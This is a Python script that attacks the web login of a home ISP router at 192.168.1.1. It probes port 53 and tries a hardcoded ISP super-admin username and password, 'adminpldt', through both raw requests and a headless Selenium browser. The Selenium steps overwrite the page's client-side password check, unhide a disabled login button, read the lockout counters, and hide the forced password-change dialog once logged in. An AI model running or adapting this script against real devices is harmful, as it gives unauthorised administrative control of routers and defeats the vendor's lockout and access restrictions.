#!/usr/bin/env python3
"""Try clean Selenium + probe port 53 and root URL."""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import requests, urllib3, os, time, subprocess

urllib3.disable_warnings()
ROUTER = "https://192.168.1.1"

# Part A: Probe alternative endpoints with requests
print("=" * 60)
print("PART A: PROBE ALTERNATIVES")
print("=" * 60)

s = requests.Session()
s.verify = False

# Root URL
print("1. Root URL...")
try:
    r = s.get(ROUTER + "/", timeout=10, allow_redirects=False)
    print("   / -> status:", r.status_code, "location:", r.headers.get("Location", "none"), "size:", len(r.text))
    print("   headers:", {k: v for k, v in r.headers.items()})
    if len(r.text) > 0:
        print("   body:", r.text[:300])
except Exception as e:
    print("   Error:", e)

# Port 53 as HTTP
print("\n2. Port 53 as HTTP...")
for proto in ["http", "https"]:
    try:
        r = requests.get(proto + "://192.168.1.1:53/", timeout=3, verify=False)
        print("   " + proto + "://192.168.1.1:53/ -> " + str(r.status_code) + " size:" + str(len(r.text)))
        print("   " + r.text[:200])
    except Exception as e:
        print("   " + proto + "://192.168.1.1:53/ -> " + str(e)[:80])

# Try login.asp with different cookies (fresh session, no lockout cookie)
print("\n3. login.asp with fresh session...")
s2 = requests.Session()
s2.verify = False
try:
    r = s2.get(ROUTER + "/login.asp", timeout=10)
    print("   Status:", r.status_code, "size:", len(r.text))
    has_login = "txt_Username" in r.text
    print("   Has login form:", has_login)
    if has_login:
        # Try submitting as adminpldt
        token_r = s2.get(ROUTER + "/asp/GetRandCount.asp", timeout=10)
        token = token_r.content.decode("utf-8-sig").strip()
        print("   Token:", token[:50])

        import base64
        pwd_b64 = base64.b64encode(b"AC2DIU7QW3ERTY6UPAS4DFG").decode()
        r = s2.post(ROUTER + "/login.cgi",
                    data={"UserName": "adminpldt", "PassWord": pwd_b64, "Language": "english", "x.X_HW_Token": token},
                    allow_redirects=False, timeout=10)
        print("   login.cgi: " + str(r.status_code) + " " + r.text[:300])
except Exception as e:
    print("   Error:", e)

# Try with different User-Agent
print("\n4. login.asp with IE User-Agent...")
s3 = requests.Session()
s3.verify = False
s3.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko"})
try:
    r = s3.get(ROUTER + "/login.asp", timeout=10)
    print("   Status:", r.status_code, "size:", len(r.text), "has_login:", "txt_Username" in r.text)
except Exception as e:
    print("   Error:", e)

# Try with raw socket
print("\n5. Raw TCP probe on port 53...")
try:
    import socket
    s4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s4.settimeout(3)
    s4.connect(("192.168.1.1", 53))
    # Send HTTP GET
    s4.sendall(b"GET / HTTP/1.0\r\nHost: 192.168.1.1\r\n\r\n")
    data = s4.recv(4096)
    print("   Response:", data[:500])
    s4.close()
except Exception as e:
    print("   Error:", e)

# Part B: Clean Selenium session
print("\n" + "=" * 60)
print("PART B: CLEAN SELENIUM SESSION")
print("=" * 60)

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    opts.add_argument("--incognito")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(15)
    return driver

driver = setup_driver()
try:
    # Try login.asp first (not admin.html)
    print("6. login.asp via Selenium (incognito)...")
    driver.get(ROUTER + "/login.asp")
    time.sleep(4)
    has_login = "txt_Username" in driver.page_source
    print("   Has login form:", has_login)
    if has_login:
        lock = driver.execute_script("try { return window.LockLeftTime; } catch(e) { return 'n/a'; }")
        lt2 = driver.execute_script("try { return window.LoginTimes; } catch(e) { return 'n/a'; }")
        print("   LockLeftTime:", lock, "LoginTimes:", lt2)

        # Try submitting as adminpldt by bypassing client check
        u = driver.find_element(By.ID, "txt_Username")
        p = driver.find_element(By.ID, "txt_Password")
        driver.execute_script("arguments[0].value=''; arguments[1].value='';", u, p)
        u.send_keys("adminpldt")
        p.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")
        driver.execute_script("""
            window.CheckPassword = function() { return 2; };
            window.setDisable = function() {};
        """)
        driver.execute_script("document.getElementById('button').style.display='';")
        driver.find_element(By.ID, "button").click()
        time.sleep(5)
        url = driver.current_url
        has_login2 = "txt_Username" in driver.page_source
        print("   After submit -> URL:", url, "login:", has_login2)
        if not has_login2:
            print("   SUCCESS!")
            lvl = driver.execute_script("try { return window.Userlevel; } catch(e) { return 'err'; }")
            print("   Userlevel:", lvl)

            # Try accessing pages
            for pg in ["/html/amp/wlanbasic/WlanBasic.asp?2G",
                       "/html/ssmp/info/basic/system_info.asp"]:
                driver.get(ROUTER + pg)
                time.sleep(3)
                has_l = "txt_Username" in driver.page_source
                print("   " + pg + " -> login:" + str(has_l))
    else:
        print("   Login page blocked (403 or no form)")
        url = driver.current_url
        print("   URL:", url)

    # Also try admin.html
    print("\n7. admin.html via Selenium (incognito)...")
    driver.get(ROUTER + "/admin.html")
    time.sleep(4)
    has_login = "txt_Username" in driver.page_source
    lvl = driver.execute_script("try { return window.Userlevel; } catch(e) { return 'n/a'; }")
    print("   Has login form:", has_login, "Userlevel:", lvl)
    if has_login:
        lock = driver.execute_script("try { return window.LockLeftTime; } catch(e) { return 'n/a'; }")
        print("   LockLeftTime:", lock)

        # Check if lockout is cleared
        if str(lock) == "0" or str(lock) == "undefined":
            print("   Lockout appears cleared! Trying login...")
            u = driver.find_element(By.ID, "txt_Username")
            p = driver.find_element(By.ID, "txt_Password")
            driver.execute_script("arguments[0].value=''; arguments[1].value='';", u, p)
            u.send_keys("adminpldt")
            p.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")
            driver.execute_script("document.getElementById('button').style.display='';")
            driver.find_element(By.ID, "button").click()
            time.sleep(6)
            url = driver.current_url
            has_login2 = "txt_Username" in driver.page_source
            lvl2 = driver.execute_script("try { return window.Userlevel; } catch(e) { return 'err'; }")
            print("   URL:", url, "login:", has_login2, "Userlevel:", lvl2)
            if int(str(lvl2)) == 2:
                print("\n*** LOGIN SUCCESS ***")
                # Skip form and explore
                driver.execute_script("""
                    var m = document.getElementById('base_mask');
                    var p = document.getElementById('pwd_modify');
                    if (m) m.style.display = 'none';
                    if (p) p.style.display = 'none';
                """)

finally:
    driver.quit()
